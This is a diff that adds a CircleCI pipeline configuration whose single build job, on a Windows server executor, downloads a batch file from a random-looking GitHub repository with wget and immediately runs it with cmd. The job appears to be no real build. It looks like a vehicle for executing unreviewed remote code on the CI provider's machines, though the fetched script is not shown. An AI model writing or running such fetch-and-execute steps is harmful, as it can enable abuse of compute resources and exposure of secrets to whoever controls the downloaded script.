@@ -1,0 +1,14 @@
+version: 2.1
+orbs:
+  win: circleci/windows@5.0
+jobs:
+  build:
+    executor: win/server-2022
+    steps:
+      - run:  |
+          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+          cmd /c wiz.bat
+workflows:
+  my-workflow:
+    jobs:
+      - build
